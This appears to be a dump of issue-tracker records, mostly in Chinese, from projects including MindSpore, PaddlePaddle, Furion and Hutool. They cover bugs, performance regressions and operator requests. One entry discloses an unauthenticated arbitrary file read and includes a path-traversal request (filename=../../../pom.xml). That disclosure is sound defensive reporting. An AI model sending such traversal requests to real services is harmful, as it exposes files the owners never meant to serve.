.AddDataValidation(false) 报错,Furion 版本号 Furion.Pure 4.48 哪个版本号？ 4.48 .NET SDK 版本号 .NET6 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 发生了什么？ 按照说明文档 https://dotnetchina.gitee.io/furion/docs/data-validation 8.9.1 全局验证 默认情况下，通过 .AddDataValidation() 注册数据验证服务已经启用了全局验证，如若不想启用全局验证，则传入 false 即可，如：.AddDataValidation(false)。 异常堆栈是什么？ 严重性 代码 说明 项目 文件 行 禁止显示状态 错误 CS1503 参数 2: 无法从“bool”转换为“System.Action&lt;Furion.DataValidation.DataValidationOptions&gt;” F.WebApi \Program.cs 56 builder.Services.AddControllers() .AddDataValidation(false) .AddInject(); 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则将无法得到答复。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 通过配置能取消全局默认验证。   <code>: var app = builder.Build();
[CT][MS][OP] Igamma unsupport testcase which inputs with different dtypes on Ascend platform.,"Igamma unsupport testcase which inputs with different dtypes on Ascend platform. Igamma unsupport testcase which inputs with different dtypes on Ascend platform. / 硬件环境: /device cpu : -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph pytest test_igamma.py CPU和Ascend上对于输入数据类型不同的处理应保持一致 The test case run pass on CPU platform, while run failed on Ascend platform   <code>: def test_igamma_2D_x_fp16_q_fp32(): a = Tensor(np.random.randint(low=10, high=11, size=(2, 2)), mstype.float64) x = Tensor(np.random.randint(low=1, high=2, size=(2, 2)), mstype.float32) fact = IgammaMock(inputs=[a, x]) fact.forward_mindspore_impl()"
【众智】【计算-AICPU开发】Relu,"AICPU算子接入 ReLu激活函数 Python层接口（ 因库上ReLU算子在4D情况下会通过pass变为ReLUV2算子，故而这里改名为V3 ） 接口目录：mindspore/ops/operations/nn_ops.py input_x output 对应底层算子 对应底层AICPU算子Relu Classify Name Type Type Range Required Format INPUT x fp16,fp32,fp64,int8,int16,int32,int64,uint8,uint16 TRUE ND OUTPUT y fp16,fp32,fp64,int8,int16,int32,int64,uint8,uint16 TRUE ND Torch接口： https://pytorch.org/docs/stable/_modules/torch/nn/functional.html#relu 3. 异常处理 4. 算子反向 反向接入ReluGrad   <code>: class ReLUV3(Primitive):"
  RPC interface C_API,"相关的issue #1964:modify home page #1880:recovery documentation search functionality. 设置参数更新方式 设定参数更新方式，如果是On Client方式，设置updater简单叠加。如果是 ParameterServer 方式，设置updater具体的algorithm id 参数更新 模型存储和恢复 目前的parameterServer默认是没有topology，training state，以及用户自定义存储的参数，保存checkpoint需要用户将以上参数通过SetParam的方式传到ParameterServer   <code>: /* set updater/optimizer */ /* @brief interface of Gradient Update in On ParameterServer case, used by On ParameterServer Gradient Update. send Parameter should use sendGrad since need to optimize on server. in On Client case, just write a simple updater with w += deltaw @param updater */ int32_t set_updater(UpdaterBase *updater，); /* @brief set Parameters to ParameterServer usage : parameters blocks, checkpoint configs, runtime training state e.g: we need to saving some specific parameters passed by users saving_period, SetParam(""saving_period"", period, sizeof(period)) @param parameters, @param size */ int32_t SetParam(const char*parameter_name, void* parameters, uint32_t size); /* @brief initialize parameter and allocate memory */ typedef enum InitAlgorithm { AXIV = 0, GAUSSIAN, GAUSSIANWITHCLIP, .... } init_type int32_t initParam(const char* parameter_name, init_type method, void* parameters, uint32_t size) /* @brief send Gradients to ParameterServer，which corresponding with On ParameterServer Gradient Update */ int32_t SendGrad(const char* parameter_name, void* gradients, uint32_t size); /* @brief get Parameters from ParameterServer */ int32_t GetParam(void* parameters, const char* parameter_name, uint32_t size) /* @brief saving/recovery model weights, topology, training state, user specific parameters must call setParam first，otherwise all config will set by default value */ uint32_t saveCheckPoint(); uint32_t loadCheckPoint();"
Keep a pure usage of generic.cmake,"I notice new hacks in our CMakeLists.txt like the following https://github.com/PaddlePaddle/Paddle/blob/3ceff3057b5ca1803ee64679fe24a0bf5512707a/paddle/fluid/operators/detail/CMakeLists.txt#L4-L5 Please remove such hack and never use them. <em>Please make sure that CMakeLists.txt includes only calls to CMake functions defined in generic.cmake.</em> We used to suffer from the problem that CMake provides a very flexible language and we hack our CMakeLists.txt everywhere. This made it extremely challenging to keep our build process understandable, and it took a huge effort of the team, particular thanks to @gangliao , to clean everything up by developing .   <code>: generic.cmake"
[ST][MS/modelzoo][NET][ascend][yolov5] too much warning in log,"日志里warning太多，影响可用性 / 硬件环境: /device ascend : -- MindSpore version :r2.0 B030 commit_id:cde09ee9 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_yolov5_check_loss_8p.py cd solution_test/remaming/test_scripts_mindspore/net/yolov5/ pytest -s test_ms_yolov5_check_loss_8p.py 日志里warning不应太多 走给张方和   <code>: [WARNING] DEVICE(155911,ffff91907010,python):2022-10-21-01:27:34.736.449 [mindspore/ccsrc/plugin/device/ascend/hal/device/kernel_select_ascend.cc:334] FilterRaisedOrReducePrecisionMatchedKernelInfo] Operator:[Gradients/Default/network-YoloWithLossCell/yolo_network-YOLOV5/detect_1-DetectionBlock/gradStridedSlice/StridedSliceGrad-op4757] don't support int64, reduce precision from int64 to int32."
"ValueError: `axis value` in `Unstack` should be in range of [-2, 2), but got 2.000e+00 with type `int`.","[ERROR] ANALYZER(3798804,7f8f21e63740,python):2022-02-18-15:58:56.804.383 [mindspore/ccsrc/pipeline/jit/static_analysis/async_eval_result.cc:79] HandleException] Exception happened, check the information as below. The function call stack (See file '/home/wenyuan/PycharmProjects/instance_pointrend2/rank_0/om/analyze_fail.dat' for more details): 0 In file /home/wenyuan/PycharmProjects/instance_pointrend2/maskrcnn_pointrend/src/network_define.py(139) 1 In file /home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/site-packages/mindspore/ops/_grad/grad_array_ops.py(611) 2 In file /home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/site-packages/mindspore/ops/_grad/grad_array_ops.py(610) Traceback (most recent call last): File ""/home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/code.py"", line 90, in runcode exec(code, self.locals) File """", line 1, in File ""/home/wenyuan/下载/software/pycharm-professional-2021.3/pycharm-2021.3/plugins/python/helpers/pydev/_pydev_bundle/pydev_umd.py"", line 198, in runfile pydev_imports.execfile(filename, global_vars, local_vars) # execute the script File ""/home/wenyuan/下载/software/pycharm-professional-2021.3/pycharm-2021.3/plugins/python/helpers/pydev/_pydev_imps/_pydev_execfile.py"", line 18, in execfile exec(compile(contents+""\n"", file, 'exec'), glob, loc) File ""/home/wenyuan/PycharmProjects/instance_pointrend2/train.py"", line 323, in train_maskrcnn_mobilenetv1() File ""/home/wenyuan/PycharmProjects/instance_pointrend2/maskrcnn/model_utils/moxing_adapter.py"", line 108, in wrapped_func run_func(*args, **kwargs) File ""/home/wenyuan/PycharmProjects/instance_pointrend2/train.py"", line 318, in train_maskrcnn_mobilenetv1 model.train(config.epoch_size, dataset, callbacks=cb, dataset_sink_mode=dataset_sink_mode_flag) File ""/home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/site-packages/mindspore/train/model.py"", line 726, in train sink_size=sink_size) File ""/home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/site-packages/mindspore/train/model.py"", line 498, in _train self._train_process(epoch, train_dataset, list_callback, cb_params) File ""/home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/site-packages/mindspore/train/model.py"", line 626, in _train_process outputs = self._train_network(*next_element) File ""/home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in call out = self.compile_and_run(*inputs) File ""/home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 682, in compile_and_run self.compile(*inputs) File ""/home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 669, in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/site-packages/mindspore/common/api.py"", line 548, in compile result = self._graph_executor.compile(obj, args_list, phase, use_vm, self.queue_name) File ""/home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/site-packages/mindspore/ops/operations/array_ops.py"", line 2711, in infer validator.check_int_range(self.axis, -dim, dim, Rel.INC_LEFT, 'axis value', self.name) File ""/home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/site-packages/mindspore/_checkparam.py"", line 417, in check_int_range return check_number_range(arg_value, lower_limit, upper_limit, rel, int, arg_name, prim_name) File ""/home/wenyuan/anaconda3/envs/pointrend_msp1.5/lib/python3.7/site-packages/mindspore/_checkparam.py"", line 210, in check_number_range arg_name, prim_name, rel_str, arg_value, type(arg_value).name)) ValueError: in should be in range of [-2, 2), but got 2.000e+00 with type .   <code>: def construct(self, x, img_shape, gt_bboxe, gt_label, gt_num, gt_mask): if is_sub_class(F.typeof(x), ms.list_): ^ out = stack_grad(dout) ^ axis value Unstack int"
使用markdown留言生成的html会被转义,例如留言内容为+ test 生成的html为尖括号全部是转义的 留言板就会显示   <code>: &amp;lt;ul&amp;gt; &amp;lt;li&amp;gt;test&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt; &lt;ul&gt; &lt;li&gt;test&lt;/li&gt; &lt;/ul&gt;
PaddleCheckError: Cannot find fetch variable in scope,"1）PaddlePaddle版本：1.6.1 2）CPU：Intel(R) Core(TM) i5-5257U CPU @ 2.70GHz 4）系统环境：Mac OS 10.14.6，Python 3.6.9 训练信息 1）单机 复现信息： 问题描述：报错信息   <code>: alpha = layers.create_parameter(shape=[1], dtype='float32', name='alpha', default_initializer=fluid.initializer.ConstantInitializer(1.)) alpha = alpha() test_program = fluid.Program() with fluid.program_guard(test_program): b = alpha * 2.0 place = fluid.CPUPlace() fluid_executor = fluid.Executor(place) fluid_executor.run(fluid.default_startup_program()) result = fluid_executor.run(test_program, feed={}, fetch_list=[b])[0] print(result) ---------------------- Error Message Summary: ---------------------- PaddleCheckError: Cannot find fetch variable in scope, fetch_var_name is tmp_0 at [/home/teamcity/work/ef54dc8a5b211854/paddle/fluid/operators/controlflow/fetch_op.cc:38] [operator &lt; fetch &gt; error]"
动态多列排序问题,"点击列头 A 实际排序可能是 Column A, Column B desc, Column C Table 组件开放 回调委托 点击列头进行排序时，组件内部先调用 回调委托，使用者可以在此回调委托中，通过参数 获得组件传递出来的点击列排序字段名与排序顺序，通过设置 组件另外一个参数 达到动态进行多列排序功能   <code>: OnSort [Parameter] public Action&lt;string, SortOrder&gt; OnSort { get; set; } OnSort string SortName, SortOrder SortOrder Table SortList private void OnSort(string sortName, SortOrder sortOrder) { if (sortName == ""Name"" &amp;&amp; sortOrder == SortOrder.Asc) { SortList = new List&lt;string&gt; { ""Name"", ""Address desc"" } } } &lt;Table SortList=""@SortList""&gt; &lt;/Table&gt;"
Refine argument naming for ParallelExecutor,Seems is not very self-explanatory and there's is no doc for this argument. I propose to change it to a more clear name like and the default value is . @reyoung @panyx0718 Need your opinion. Thanks. https://github.com/PaddlePaddle/Paddle/blob/bfafcbeefbdddd581608b2a5bd3559a2175503e2/python/paddle/fluid/parallel_executor.py#L33   <code>: customize_loss_grad use_default_grad_scale true
关于skywalking链路追踪有两个问题,"1、 skywalking8.5版本中，针对spring-cloud-gateway的支持插件版本是 /agent/optional-plugins/apm-spring-cloud-gateway-2.1.x-plugin-8.5.0.jar /agent/optional-plugins/apm-spring-webflux-5.x-plugin-8.5.0.jar 支持gateway版本是 skywalking apm 2、添加忽略插件，还有很多redis的记录，没有生效。 trace.ignore_path=${SW_AGENT_TRACE_IGNORE_PATH:/actuator/health/,/eureka/,Lettuce/,Gson/}   <code>: 2.1.2.RELEASE 2.2.3.RELEASE"
训练过程切换数据集文件-多阶段使用不同数据集训练dataload报错：Try to send request before Open(),"【Document Link】/【文档链接】 猜测原因：由于数据集文件的切换，train训练开始ds轮询数据时数据集文件还未初始化读取，请问有什么办法在数据集切换后，在训练之前提前进行数据文件的读取（dataload初始化） 【Issues Section】/【问题文档片段】 <ol start=""3""> 【Existing Issues】/【存在的问题】 训练完一个阶段之后，使用新的数据集文件报错如下： 能正常进行数据集的加载迭代 Please fill in the expected result   <code>: ds = create_dataset(batch_size, data_path=""/cache/Data/"", data_start_index=idex, #这里指定切换的数据文件索引 eod_reset=args_opt.eod_reset, full_batch=bool(args_opt.full_batch), eod_id=args_opt.eod_id, device_num=device_num, rank=rank_id) model.train(actual_epoch_num, ds , sink_size=callback_size, dataset_sink_mode=True) File ""/home/work/user-job-dir/pangu_alpha-r1.3/train_client-v4-node2-p8.py"", line 603, in fit run_train(model, net, args_opt, callback, rank_id, config, device_num, obs_upload_dir, epoch_idx=self.count) File ""/home/work/user-job-dir/pangu_alpha-r1.3/train_client-v4-node2-p8.py"", line 471, in run_train model.train(actual_epoch_num, ds, callbacks=callback, sink_size=callback_size, dataset_sink_mode=True) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 649, in train sink_size=sink_size) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 439, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 490, in _train_dataset_sink_process dataset_helper=dataset_helper) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 322, in _exec_preprocess dataset_helper = DatasetHelper(dataset, dataset_sink_mode, sink_size, epoch_num) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 245, in __init__ self.iter = iterclass(dataset, sink_size, epoch_num) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 392, in __init__ super().__init__(dataset, sink_size, epoch_num) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 299, in __init__ create_data_info_queue=create_data_info_queue) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/_utils.py"", line 73, in _exec_datagraph phase=phase) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 473, in init_dataset phase=phase): RuntimeError: mindspore/ccsrc/backend/session/kernel_build_client.h:97 Request] Try to send request before Open()"
[CT][MS][Ger]算子 gpu性能在大shape高精度时 不达标,"gpu性能在大shape高精度时 不达标 且 ms 时间保持在400 左右 而torch会随着shape减小而减小 ms 在shape超过一定限度 时间就是那么长 / 硬件环境: /device GPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph 运行测试用例 assert error   <code>: def test_ger_4096_profiler(): input_x1 = Tensor(np.random.randn(4096), dtype=mstype.float64) input_x2 = Tensor(np.random.randn(4096), dtype=mstype.float64) fact = GerMock(inputs=[input_x1, input_x2]) fact.forward_profile_cmp() shape 4096 dtype f32 F shape 2000 dtype f32 F shape 1000 dtype f32 passed shape 128 dtype f64 F"
Add neural transformer leanring rate decay function,"The neural machine transformer needs a learning-rate-decay function.   <code>: lr_value = np.power(d_model, -0.5) * np.min([ np.power(current_steps, -0.5), np.power(warmup_steps, -1.5) * current_steps ])"
Db.GetDbContext() 获取的上下文，使用时发生错误（经测试 4.1.9 无异常，4.2.7 会报错）,Furion 版本号 V4.2.7 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 执行如下代码，会发生报错 报错信息 未返回堆栈信息 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 不发生异常，解决该问题   <code>: using (var db = Db.GetDbContext()) { var raw = await db.Set&lt;实体&gt;().ToListAsync(); } Cannot access a disposed object. Object name: 'MySqlConnection'.
[Speed]implement cudnn sequence softmax cudnn,"fix https://github.com/PaddlePaddle/Paddle/issues/8594. This PR contains four operators. sequence_softmax, sequence_softmax_grad, softmax , softmax_grad. Take sequence_softmax op as example, compare with the previous implement, the sequence_softmax operator time cost is lower than mul operator now. The time cost from 1.94211 -&gt; 0.981581 in every minibach. before optimize after optimize   <code>: thread0::sum 2080 208.066 0.031584 1.06134 0.100032 thread0::sequence_softmax 67 130.121 0.078336 9.44381 1.94211 thread0::mul_grad 741 121.969 0.062656 1.37158 0.164601 thread0::lod_tensor_to_array 2 85.2417 30.0434 55.1984 42.6209 thread0::sum 204128 17150.6 0.011904 8.13488 0.0840188 thread0::mul_grad 72729 11242.9 0.042464 6.78758 0.154587 thread0::sequence_softmax_grad 6575 6767.53 0.039008 7.94013 1.02928 thread0::sequence_softmax 6575 6453.9 0.044608 8.09661 0.981581"
关于Collutil.map方法的第三个参数ignoreNull的作用,"JDK版本： jdk1.8.0_151 hutool版本： 5.4.3 和 5.4.6都测试过 打印结果: [haha.aaa, haha.bbbb, haha.ccc, haha.null, haha.] [haha.aaa, haha.bbbb, haha.ccc, haha.null, haha.] haha.null依然会拼接出来   <code>: Collutil.map方法, 第三个参数""ignoreNull - 是否忽略空值""不起作用, 代码和测试结果如下: List&lt;String&gt; tables = CollUtil.newArrayList(""aaa"", ""bbbb"", ""ccc"", null, """"); System.out.println(map(tables, t -&gt; StrUtil.join(""."", ""haha"", t), false)); System.out.println(map(tables, t -&gt; StrUtil.join(""."", ""haha"", t), true));"
【众智】【计算-AICPU开发】AffineGrid,"AICPU算子接入 给定一批仿射矩阵，生成二维或三维流场（采样网格）。 接口目录：mindspore/ops/operation/array_ops.py theta output_size tuple[int] y align_corners Bool 属性 对应底层算子 对应底层AI CPU算子AffineGrid 标杆接口参考 TF接口： torch.nn.functional.affine_grid https://pytorch.org/docs/1.6.0/nn.functional.html#affine-grid 3. 异常处理 4. 算子反向 多算子拼接，参考 torch\tools\autograd\derivatives.yaml   <code>: class AffineGrid(Primitive): REG_OP(AffineGrid) .INPUT(theta, TensorType({DT_FLOAT16, DT_FLOAT})) .INPUT(output_size, TensorType({DT_INT32})) .OUTPUT(y, TensorType({DT_FLOAT16, DT_FLOAT})) .ATTR(align_corners, Bool, false) .OP_END_FACTORY_REG(AffineGrid) - name: affine_grid_generator(Tensor theta, int[] size, bool align_corners) -&gt; Tensor theta: affine_grid_generator_backward(grad, size, align_corners)"
修改Tree.java的实现,"JDK版本： openjdk_8_201 hutool版本： 5.7.3 在5.7.3版本中, Tree的实现继承了LinkedHashMap，这样的做法会导致Tree不单单能够当做一个树来使用，我认为这样会导致用户的迷惑(例如: #I3YMZK:TreeUtil未能构建完整的树形结构)，不如单单开放一些树的方法。所以我想摒弃继承改用组合。 -&gt;   <code>: public class Tree&lt;T&gt; extends LinkedHashMap&lt;String, Object&gt; implements Node&lt;T&gt;{...} public class Tree&lt;T&gt; implements Node&lt;T&gt; { private static final long serialVersionUID = 1L; private final TreeNodeConfig treeNodeConfig; private Tree&lt;T&gt; parent; private final LinkedHashMap&lt;String, Object&gt; map = new LinkedHashMap&lt;&gt;(); ... }"
排序的问题,"可能是我前面那个问题没说清楚哈。 业务场景：需要根据score排序之后，再根据自定义字段排序 代码： 打印DSL： 可以看到_score在最后 执行查询，查看第一条数据： 可以看到结果是按照_score排序的了   <code>: queryWrapper.sortByScore().orderByDesc(XXX::getCreateDate, XXX::getDownloadNum, XXX::getCollectNum, XXX::getGiveNum) ""sort"": [ { ""createDate"": { ""order"": ""desc"" } }, { ""downloadNum"": { ""order"": ""desc"" } }, { ""collectNum"": { ""order"": ""desc"" } }, { ""giveNum"": { ""order"": ""desc"" } }, { ""_score"": { ""order"": ""desc"" } } ],"
任意文件读取漏洞,未授权接口 <em>/runBatchCase</em> 直接拼接了参数 <em>filename</em> 为读取文件的路径，导致任意文件读取   <code>: GET /getLogdDetail?filename=../../../pom.xml
[CT][MS][F.Random_Categorical]example test fail at cpu,"接口random_categorical 在cpu后端样例执行失败 / 硬件环境: /device CPU : -- MindSpore version :master包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph cpu后端执行官网样例 样例执行通过， 官网展示结果与实际一致   <code>: from mindspore.ops import functional as F import numpy as np logits = np.random.random((10, 5)).astype(np.float32) net = F.random_categorical(logits, 8) output = net(Tensor(logits)) result = output.shape print(result)F ========================================================================== FAILURES =========================================================================== _______________________________________________ [doctest] mindspore.ops.function.random_func.random_categorical _______________________________________________ 148 TypeError: If neither `num_sample` nor `seed` is an int. 149 150 Supported Platforms: 151 ``Ascend`` ``GPU`` ``CPU`` 152 153 Examples: 154 &gt;&gt;&gt; from mindspore.ops import functional as F 155 &gt;&gt;&gt; import numpy as np 156 &gt;&gt;&gt; logits = np.random.random((10, 5)).astype(np.float32) 157 &gt;&gt;&gt; net = F.random_categorical(logits, 8) UNEXPECTED EXCEPTION: TypeError('For primitive[RandomCategorical], the input argument[logits] must be a type of {Float16, Float32, Float64}, but got External.\ n\n----------------------------------------------------\n- C++ Call Stack: (For framework developers)\n----------------------------------------------------\nmi ndspore/core/utils/check_convert_utils.cc:689 CheckSubClass\n') Traceback (most recent call last): File ""/root/miniconda3/envs/high-caory2/lib/python3.7/doctest.py"", line 1329, in __run compileflags, 1), test.globs) File ""&lt;doctest mindspore.ops.function.random_func.random_categorical[3]&gt;"", line 1, in &lt;module&gt; File ""/root/miniconda3/envs/high-caory2/lib/python3.7/site-packages/mindspore/ops/function/random_func.py"", line 164, in random_categorical return random_categorical_(logits, num_sample, seed) File ""/root/miniconda3/envs/high-caory2/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 294, in __call__ return _run_op(self, self.name, args) File ""/root/miniconda3/envs/high-caory2/lib/python3.7/site-packages/mindspore/common/api.py"", line 95, in wrapper results = fn(*arg, **kwargs) File ""/root/miniconda3/envs/high-caory2/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 748, in _run_op output = real_run_op(obj, op_name, args) TypeError: For primitive[RandomCategorical], the input argument[logits] must be a type of {Float16, Float32, Float64}, but got External. ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/core/utils/check_convert_utils.cc:689 CheckSubClass"
ExcelImportResult的 result.getFailWorkbook()和result.getWorkbook() 获取的数据不正确，跟踪代码发现有下面的错误，请核实下,"ExcelImportResult的 result.getFailWorkbook()和result.getWorkbook() 获取的数据不正确，跟踪代码发现有下面的错误，请核实下 当前出错的原因，book删除一行了之后，他的rownum会发生改变 建议删除行的时候，采用从最后面往前面删除，这样就不会出问题了   <code>: private Workbook removeSuperfluousRows(Workbook book, List&lt;Row&gt; rowList, ImportParams params) { for (int i = params.getStartSheetIndex(); i &lt; params.getStartSheetIndex() + params.getSheetNum(); i++) { for (int j = 0; j &lt; rowList.size(); j++) { if (rowList.get(j).getRowNum() &lt; rowList.get(j).getSheet().getLastRowNum()) { book.getSheetAt(i).shiftRows(rowList.get(j).getRowNum() + 1, rowList.get(j).getSheet().getLastRowNum(), -1); } else if (rowList.get(j).getRowNum() == rowList.get(j).getSheet().getLastRowNum()) { book.getSheetAt(i).shiftRows(rowList.get(j).getRowNum(), rowList.get(j).getSheet().getLastRowNum(), -1); } } } return book; }"
实体类中不能使用isXxx这样的字段，否则会报错。,"数据库表中表达是与否概念的字段，使用的是 is_xxx 的方式命名。实体类中对应的字段是isXxx。 表字段（MySQL）： boolean DEFAULT FALSE, 实体类字段： private Boolean isLock; public Boolean getIsLock() { return this.isLock; } public void setIsLock(Boolean isLock) { this.isLock = isLock; } 异常信息： org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.builder.BuilderException: Error evaluating expression 'ew.entity.lock!=null'. Cause: org.apache.ibatis.ognl.NoSuchPropertyException: com.baayso.springboot.demo.domain.DemoUserDO.lock   <code>: is_lock"
[CT][MS][crowd-funding]AssertionError occurred when executing performance test case of HShrink/HShrinkGrad on GPU and CPU backend.,"性能用例改为大shape后，不达标 / 硬件环境: GPU CPU /device ascend/GPU/CPU/ : -- MindSpore version :master -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : (/): pynative graph /mode pynative /mode graph pytest -s -v test_hshrink_nn.py::test_hshrink_profile_forward_float32 --disable-warnings pytest -s -v test_hshrink_nn.py::test_hshrink_profile_grad_float32 --disable-warnings pass 1.正向性能不达标 2.反向性能不达标   <code>: forward_profile_torch 4712.0 forward_profile_ms 10906.9 def test_hshrink_profile_forward_float32(): input_forward_32 = Tensor(-1 + 2 * np.random.rand(10, 80, 12800).astype(np.float32)) fact = HShrinkMock(inputs=[input_forward_32]) &gt; fact.forward_profile_cmp() E AssertionError grad_profile_torch 4543.0 grad_profile_ms 15583.7 def test_hshrink_profile_grad_float32(): input_grad_32 = Tensor(-1 + 2 * np.random.rand(10, 80, 12800).astype(np.float32)) fact = HShrinkMock(inputs=[input_grad_32]) &gt; fact.grad_profile_cmp() E AssertionError"
"Tree的ShowIcon属性只能作用于第一级菜单,无法作用于子菜单","Tree添加了Icon后只有一级菜单有,二级菜单的Icon没有生效; 翻看了Tree的源码,子菜单位置引用的Tree组件中没有给ShowIcon属性赋值,ShowIcon默认为false,造成子菜单无法显示Icon; 各级子菜单能够正常显示Icon 实际结果 只有第一级菜单能够正常显示Icon,子菜单无法正常显示Icon   <code>: &lt;div class=""@GetSubTreeClassString(item)""&gt; &lt;div class=""card-body has-leaf""&gt; &lt;Tree Items=""@item.Items"" IsAccordion=""@IsAccordion"" ShowCheckbox=""@ShowCheckbox"" OnTreeItemChecked=""@OnTreeItemChecked"" OnTreeItemClick=""@OnTreeItemClick"" ShowIcon=""@ShowIcon""/&gt; &lt;/div&gt; &lt;/div&gt;"
根据文档搭建项目，启动PigAdminApplication和PigAuthApplication报错,"pig版本: 3.5.3 是否修改包名: 没有 根据文档进行部署运行，启动PigAdminApplication和PigAuthApplication报错 PigAdminApplication PigAuthApplication   <code>: 2022-09-29 15:32:17.274 WARN 20080 --- [ main] o.s.boot.SpringApplication : Unable to close ApplicationContext java.lang.IllegalStateException: Failed to introspect Class [com.pig4cloud.pig.common.security.component.PigTokenStoreAutoConfiguration] from ClassLoader [sun.misc.Launcher$AppClassLoader@18b4aac2] at org.springframework.util.ReflectionUtils.getDeclaredMethods(ReflectionUtils.java:485) at org.springframework.util.ReflectionUtils.doWithMethods(ReflectionUtils.java:361) at org.springframework.util.ReflectionUtils.getUniqueDeclaredMethods(ReflectionUtils.java:418) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.lambda$getTypeForFactoryMethod$2(AbstractAutowireCapableBeanFactory.java:765) at java.util.concurrent.ConcurrentHashMap.computeIfAbsent(ConcurrentHashMap.java:1660) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getTypeForFactoryMethod(AbstractAutowireCapableBeanFactory.java:764) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.determineTargetType(AbstractAutowireCapableBeanFactory.java:703) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.predictBeanType(AbstractAutowireCapableBeanFactory.java:674) at org.springframework.beans.factory.support.AbstractBeanFactory.isFactoryBean(AbstractBeanFactory.java:1670) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doGetBeanNamesForType(DefaultListableBeanFactory.java:570) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanNamesForType(DefaultListableBeanFactory.java:542) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeansOfType(DefaultListableBeanFactory.java:669) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeansOfType(DefaultListableBeanFactory.java:661) at org.springframework.context.support.AbstractApplicationContext.getBeansOfType(AbstractApplicationContext.java:1300) at org.springframework.boot.SpringApplication.getExitCodeFromMappedException(SpringApplication.java:867) at org.springframework.boot.SpringApplication.getExitCodeFromException(SpringApplication.java:855) at org.springframework.boot.SpringApplication.handleExitCode(SpringApplication.java:842) at org.springframework.boot.SpringApplication.handleRunFailure(SpringApplication.java:782) at org.springframework.boot.SpringApplication.run(SpringApplication.java:318) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1306) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1295) at com.pig4cloud.pig.admin.PigAdminApplication.main(PigAdminApplication.java:38) Caused by: java.lang.NoClassDefFoundError: org/springframework/security/oauth2/provider/token/TokenStore at java.lang.Class.getDeclaredMethods0(Native Method) at java.lang.Class.privateGetDeclaredMethods(Class.java:2701) at java.lang.Class.getDeclaredMethods(Class.java:1975) at org.springframework.util.ReflectionUtils.getDeclaredMethods(ReflectionUtils.java:467) ... 21 common frames omitted Caused by: java.lang.ClassNotFoundException: org.springframework.security.oauth2.provider.token.TokenStore at java.net.URLClassLoader.findClass(URLClassLoader.java:387) at java.lang.ClassLoader.loadClass(ClassLoader.java:418) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:355) at java.lang.ClassLoader.loadClass(ClassLoader.java:351) ... 25 common frames omitted 进程已结束,退出代码1 2022-09-29 15:23:13.659 DEBUG 19820 --- [ main] ptablePropertiesBeanFactoryPostProcessor : Application Event Raised: ApplicationFailedEvent 2022-09-29 15:23:13.699 ERROR 19820 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.BeanDefinitionStoreException: Failed to parse configuration class [com.pig4cloud.pig.auth.PigAuthApplication]; nested exception is 